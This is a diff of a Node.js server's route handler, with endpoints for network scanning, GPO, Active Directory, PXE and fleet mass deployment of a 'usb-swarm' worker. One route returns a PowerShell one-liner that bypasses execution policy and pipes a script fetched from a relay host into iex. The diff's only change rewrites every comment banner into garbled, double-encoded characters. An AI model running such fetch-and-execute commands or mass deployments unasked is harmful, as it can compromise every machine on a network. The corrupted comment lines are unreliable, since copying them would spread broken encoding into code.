+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/network/scan Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/network/scan') {
       var si = refs.systemIntegration;
       try {
@@ -3784,7 +3844,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/network/ping â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/network/ping Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/network/ping') {
       var body = JSON.parse(await readBody(req));
       if (!body.host) return json(res, 400, { error: 'Missing host' });
@@ -3797,11 +3857,11 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 200, { host: body.host, alive: false, error: e.message }); }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Network Auto-Deploy
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/network/deploy/scan â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/network/deploy/scan Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/network/deploy/scan') {
       var nd = _refs.networkDeployer;
       if (!nd) return json(res, 500, { error: 'Network deployer not initialized' });
@@ -3811,7 +3871,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/network/deploy â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/network/deploy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/network/deploy') {
       var nd = _refs.networkDeployer;
       if (!nd) return json(res, 500, { error: 'Network deployer not initialized' });
@@ -3821,7 +3881,7 @@ async function handleRequest(req, res) {
       return json(res, result.success ? 200 : 400, result);
     }
 
-    // â•â•â• POST /api/network/auto-deploy â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/network/auto-deploy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/network/auto-deploy') {
       var nd = _refs.networkDeployer;
       if (!nd) return json(res, 500, { error: 'Network deployer not initialized' });
@@ -3830,25 +3890,25 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â•â•â• GET /api/network/deployments â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/network/deployments Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/network/deployments') {
       var nd = _refs.networkDeployer;
       if (!nd) return json(res, 200, { deployments: [], status: {} });
       return json(res, 200, { deployments: nd.getDeployments() });
     }
 
-    // â•â•â• GET /api/network/deploy/log â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/network/deploy/log Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/network/deploy/log') {
       var nd = _refs.networkDeployer;
       if (!nd) return json(res, 200, { log: '' });
       return json(res, 200, { log: nd.getLog() });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // GPO Mass Deployment
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/deploy/gpo â•â•â• (serves GPO startup script)
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy/gpo Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â (serves GPO startup script)
     if (method === 'GET' && reqPath === '/api/deploy/gpo') {
       var gpoPath = path.join(__dirname, '..', 'deploy', 'gpo-startup.ps1');
       try {
@@ -3859,7 +3919,7 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/deploy/worker.js â•â•â• (serves worker for GPO installs)
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy/worker.js Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â (serves worker for GPO installs)
     if (method === 'GET' && reqPath === '/api/deploy/worker.js') {
       var wPath = path.join(__dirname, '..', 'usb-swarm', 'worker.js');
       try {
@@ -3870,18 +3930,18 @@ async function handleRequest(req, res) {
       return;
     }
 
-    // â•â•â• GET /api/deploy/oneliner â•â•â• (returns copy-paste one-liner)
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy/oneliner Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â (returns copy-paste one-liner)
     if (method === 'GET' && reqPath === '/api/deploy/oneliner') {
       var relay = _refs.config.relay?.url || 'https://gateway.doomtrader.com:9700';
       var oneliner = "powershell -ep bypass -c \"irm '" + relay + "/api/deploy/gpo' | iex\"";
       return json(res, 200, { oneliner: oneliner, relay: relay });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Active Directory Mass Deployer
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/ad/connect â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/ad/connect Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/ad/connect') {
       var ADDeployer = require('./ad-deployer');
       var body = JSON.parse(await readBody(req));
@@ -3891,7 +3951,7 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â•â•â• GET /api/ad/computers â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/ad/computers Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/ad/computers') {
       if (!_refs.adDeployer) return json(res, 400, { error: 'Not connected to AD' });
       var adQuery = url.parse(req.url, true).query || {};
@@ -3905,7 +3965,7 @@ async function handleRequest(req, res) {
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/ad/deploy â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/ad/deploy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/ad/deploy') {
       if (!_refs.adDeployer) return json(res, 400, { error: 'Not connected to AD' });
       var body = JSON.parse(await readBody(req));
@@ -3919,7 +3979,7 @@ async function handleRequest(req, res) {
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/ad/deploy/:computer â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/ad/deploy/:computer Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.startsWith('/api/ad/deploy/')) {
       if (!_refs.adDeployer) return json(res, 400, { error: 'Not connected to AD' });
       var computer = decodeURIComponent(reqPath.replace('/api/ad/deploy/', ''));
@@ -3930,17 +3990,17 @@ async function handleRequest(req, res) {
       } catch(e) { return json(res, 500, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/ad/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/ad/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/ad/status') {
       if (!_refs.adDeployer) return json(res, 200, { connected: false, domain: null, computerCount: 0, deployed: 0, failed: 0, pending: 0, machines: {} });
       return json(res, 200, _refs.adDeployer.getStatus());
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // PXE Network Boot Server
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/pxe/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/pxe/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/pxe/status') {
       var PXEServer = require('./pxe-server');
       if (!_refs.pxeServer) {
@@ -3950,7 +4010,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.pxeServer.getStatus());
     }
 
-    // â•â•â• POST /api/pxe/start â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/pxe/start Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/pxe/start') {
       var PXEServer = require('./pxe-server');
       if (!_refs.pxeServer) {
@@ -3965,7 +4025,7 @@ async function handleRequest(req, res) {
       }
     }
 
-    // â•â•â• POST /api/pxe/stop â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/pxe/stop Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/pxe/stop') {
       if (_refs.pxeServer) {
         await _refs.pxeServer.stop();
@@ -3974,31 +4034,31 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: true, running: false });
     }
 
-    // â•â•â• GET /api/pxe/clients â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/pxe/clients Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/pxe/clients') {
       var clients = _refs.pxeServer ? _refs.pxeServer.getStatus().clients : [];
       return json(res, 200, { clients: clients });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Fleet Deployer (Ansible / Salt)
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/fleet/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/fleet/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/fleet/status') {
       var FleetDeployer = require('./fleet-deployer');
       if (!_refs.fleetDeployer) _refs.fleetDeployer = new FleetDeployer();
       return json(res, 200, _refs.fleetDeployer.getStatus());
     }
 
-    // â•â•â• GET /api/fleet/hosts â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/fleet/hosts Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/fleet/hosts') {
       var FleetDeployer = require('./fleet-deployer');
       if (!_refs.fleetDeployer) _refs.fleetDeployer = new FleetDeployer();
       return json(res, 200, { hosts: _refs.fleetDeployer.hosts });
     }
 
-    // â•â•â• POST /api/fleet/deploy â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/fleet/deploy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/fleet/deploy') {
       var FleetDeployer = require('./fleet-deployer');
       if (!_refs.fleetDeployer) _refs.fleetDeployer = new FleetDeployer();
@@ -4017,7 +4077,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: true, message: 'Deploy started via ' + method30 });
     }
 
-    // â•â•â• POST /api/fleet/add-host â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/fleet/add-host Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/fleet/add-host') {
       var FleetDeployer = require('./fleet-deployer');
       if (!_refs.fleetDeployer) _refs.fleetDeployer = new FleetDeployer();
@@ -4026,25 +4086,25 @@ async function handleRequest(req, res) {
       return json(res, result31.ok ? 200 : 400, result31);
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Cloud Auto-Scaler
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
